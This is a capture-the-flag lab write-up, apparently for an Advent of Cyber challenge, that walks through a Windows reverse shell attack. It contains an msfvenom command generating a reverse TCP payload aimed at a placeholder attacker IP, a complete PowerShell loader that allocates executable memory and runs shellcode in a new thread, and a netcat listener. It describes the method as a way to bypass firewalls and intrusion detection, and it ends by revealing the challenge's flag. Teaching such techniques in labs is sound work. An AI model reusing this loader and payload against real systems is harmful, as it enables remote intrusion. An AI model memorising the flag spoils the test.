### Grasping the Fundamentals of Shellcode

Shellcode, a small piece of code commonly used in exploits, typically enables remote access to compromised systems. It’s usually written in assembly language and serves to execute commands or gain control over the target system. To make use of shellcode in a penetration testing scenario, I began by exploring how to create and deploy it effectively.

### Generating Reverse Shellcode

For my demonstration at the conference, I needed to generate shellcode for a reverse shell—a type of payload where the target machine initiates a connection back to the attacker’s system. This technique helps evade detection since the connection is made from inside the target’s network. 

To generate the reverse shell, I used **msfvenom**, a tool that facilitates the creation of payloads. The command I used was:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell
```

#### Command Breakdown:

- `-p windows/x64/shell_reverse_tcp`: This specifies the reverse shell payload for Windows x64 systems.
- `LHOST=ATTACKBOX_IP`: This sets the IP address of my attack machine, where the reverse shell will connect.
- `LPORT=1111`: This designates the listening port on my machine.
- `-f powershell`: This formats the output as a PowerShell script, suitable for execution on Windows systems.

The output generated by this command is a hex-encoded byte array representing the actual shellcode, ready for deployment on the target system.

### Executing Shellcode with PowerShell

Once the reverse shell was generated, I needed to execute it on the target system. PowerShell provided a convenient way to do this. To achieve this, I wrote a PowerShell script that would:

1. Allocate memory for the shellcode.
2. Copy the shellcode into the allocated memory.
3. Execute the shellcode by creating a new thread.

The script relied on Windows API functions such as `VirtualAlloc` and `CreateThread` to manage memory and execution. Below is an example of the PowerShell script structure:

```powershell
$VrtAlloc = @"
using System;
using System.Runtime.InteropServices;

public class VrtAlloc{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
}
"@
Add-Type $VrtAlloc 

$WaitFor= @"
using System;
using System.Runtime.InteropServices;

public class WaitFor{
 [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
}
"@
Add-Type $WaitFor

$CrtThread= @"
using System;
using System.Runtime.InteropServices;

public class CrtThread{
 [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@
Add-Type $CrtThread   
```

### Detailed Explanation of the Script:

This script uses three C# classes in PowerShell to call the necessary Windows API functions:

- **VirtualAlloc**: Allocates memory to store the shellcode.
- **CreateThread**: Starts a new thread to execute the shellcode.
- **WaitForSingleObject**: Waits for the shellcode to complete before proceeding.

To load and execute the shellcode in memory, I used the following code:

```powershell
[Byte[]] $buf = SHELLCODE_PLACEHOLDER
[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

- `$buf`: This array holds the actual shellcode.
- The `VirtualAlloc` function allocates space in memory for the shellcode.
- `CreateThread` initiates the shellcode in a new thread.
- `WaitForSingleObject` pauses the script until the shellcode has finished executing.

### Listening for the Reverse Shell

On my attack machine, I needed to set up a listener to catch the incoming connection. I used **Netcat** (`nc`), a simple and powerful tool for this task. The command I used to listen on port 1111 was:

```bash
nc -nvlp 1111
```

This command listens for a connection from the target machine on port 1111. Once the shellcode is executed, the reverse shell will connect back to my attack machine.

### Testing and Troubleshooting

After deploying the shellcode on the target machine using PowerShell, I was able to issue commands like `dir` to list the directories on the target system. However, after some time, the connection stopped. Upon investigation, I realized the IP and port settings had been altered in the shellcode. I fixed the values to reflect the correct IP (`ATTACKBOX_IP`) and port (`4444`), and upon re-execution, I successfully regained access to the system.

### Finally...

Through this process, I demonstrated how to generate, deploy, and manage shellcode for reverse shells. This technique is crucial for bypassing firewalls and intrusion detection systems by ensuring the connection is initiated from within the target network. It also highlights the importance of maintaining careful control over the execution environment, especially when working with remote shells.

**Answers**

*What is the flag value once Glitch gets reverse shell on the digital vault using port 4444? Note: The flag may take around a minute to appear in the C:\Users\glitch\Desktop directory. You can view the content of the flag by using the command type C:\Users\glitch\Desktop\flag.txt.* **AOC{GOT _MY_ACCESS_B@CK007}**
